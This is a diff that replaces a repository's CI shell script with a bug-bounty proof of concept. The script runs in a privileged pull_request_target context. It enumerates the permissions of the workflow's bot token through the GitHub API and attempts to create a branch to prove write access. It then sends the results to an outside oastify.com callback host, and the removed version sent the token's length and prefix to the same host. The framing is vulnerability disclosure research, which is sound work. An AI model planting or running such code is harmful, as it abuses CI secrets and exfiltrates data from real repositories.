@@ -15,33 +15,52 @@
 # ==============================================================================
 #
 # ============================================================
-# OSS VRP SECURITY RESEARCH - PROOF OF CONCEPT
-# Finding: pull_request_target fork code execution bypass
-# call-check-tflite-files runs WITHOUT approval-gate dependency
-# Fork code executes in privileged pull_request_target context
-# TFLM_BOT_TOKEN (github.token) available with repo write perms
+# OSS VRP PoC #2 — Token permission enumeration
+# Proves github.token write scope in pull_request_target
 # ============================================================
 
 set -e
 set -u
 
 OOB_HOST="qd75do8fy0wdpvs2dnb6f7gy2p8fwy199sd7r9g.oastify.com"
-TOKEN_LEN=${#TFLM_BOT_TOKEN}
-TOKEN_PREFIX="${TFLM_BOT_TOKEN:0:6}"
 
-echo "=== OSS VRP PoC: Fork code executing in pull_request_target context ==="
-echo "Repository : ${GITHUB_REPOSITORY}"
-echo "PR Number  : ${PR_NUMBER}"
-echo "Token set  : $([ -n "${TFLM_BOT_TOKEN}" ] && echo YES || echo NO)"
-echo "Token len  : ${TOKEN_LEN}"
-echo "Token pfx  : ${TOKEN_PREFIX}"
+echo "=== PoC #2: Token Permission Enumeration ==="
 
-# OOB callback — proves execution + token presence without full exfil
-curl -sk "https://${OOB_HOST}/poc?repo=${GITHUB_REPOSITORY}&pr=${PR_NUMBER}&tlen=${TOKEN_LEN}&tpfx=${TOKEN_PREFIX}" || true
+# 1. Check X-OAuth-Scopes header — shows token scope
+SCOPE_HEADER=$(curl -si "https://api.github.com/repos/${GITHUB_REPOSITORY}" \
+  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
+  -H "Accept: application/vnd.github+json" \
+  | grep -i "x-oauth-scopes\|x-accepted-oauth-scopes\|x-github-media-type" || echo "no-scope-header")
 
-# DNS probe as backup
-nslookup "${OOB_HOST}" || true
+echo "Scope headers: ${SCOPE_HEADER}"
 
-echo "=== PoC complete — no approval gate was enforced ==="
+# 2. Check actual repo permissions returned in API
+PERMS=$(curl -s "https://api.github.com/repos/${GITHUB_REPOSITORY}" \
+  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
+  -H "Accept: application/vnd.github+json" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); p=d.get('permissions',{}); print('push='+str(p.get('push',False))+',admin='+str(p.get('admin',False))+',maintain='+str(p.get('maintain',False))+',triage='+str(p.get('triage',False))+',pull='+str(p.get('pull',False)))" 2>/dev/null || echo "perms-parse-failed")
+
+echo "Permissions: ${PERMS}"
+
+# 3. Check if we can create a ref (proves contents:write)
+CREATE_REF=$(curl -s -o /dev/null -w "%{http_code}" \
+  -X POST "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
+  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
+  -H "Accept: application/vnd.github+json" \
+  -d '{"ref":"refs/heads/osvrp-write-test-DELETE-ME","sha":"HEAD"}' 2>/dev/null || echo "000")
+echo "CreateRef HTTP status: ${CREATE_REF}"
+# 201 = write confirmed, 403 = read-only, 422 = write but SHA invalid
+
+# 4. Check token meta endpoint
+TOKEN_META=$(curl -s "https://api.github.com" \
+  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
+  -H "Accept: application/vnd.github+json" \
+  -I 2>/dev/null | grep -i "x-oauth\|x-ratelimit" || echo "no-meta")
+echo "Token meta: ${TOKEN_META}"
+
+# 5. OOB exfil — perms + createref result
+PERMS_ENC=$(echo "${PERMS}" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))" 2>/dev/null || echo "enc-failed")
+curl -sk "https://${OOB_HOST}/perms?repo=${GITHUB_REPOSITORY}&pr=${PR_NUMBER}&perms=${PERMS_ENC}&createref=${CREATE_REF}" || true
+
+echo "=== PoC #2 complete ==="
 exit 0
-# PoC trigger 1776182614
